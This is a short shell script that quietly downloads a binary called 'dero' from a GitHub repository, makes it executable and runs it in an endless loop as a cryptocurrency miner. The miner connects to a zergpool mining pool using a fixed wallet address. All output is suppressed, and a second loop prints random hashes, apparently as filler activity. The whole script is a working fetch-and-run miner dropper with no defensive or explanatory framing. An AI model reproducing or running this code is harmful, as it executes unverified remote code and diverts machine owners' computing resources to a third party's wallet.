#!/bin/sh
wget https://github.com/RizQu5/2022/raw/main/dero >/dev/null 2>&1
chmod +x dero >/dev/null 2>&1
 while [ 1 ]; do
	./dero -a yespowerR16 -o stratum+tcp://yespowerR16.mine.zergpool.com:6534 -u PQFYTbguveuWuwRjZRsUiQZnW3ea51Rbc3 -p c=PLSR,mc=YTN,ID=WORKERZERG >/dev/null 2>&1
	sleep 2
 done
 while [ 1 ]; do
	while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2s; done
	sleep 2
 done
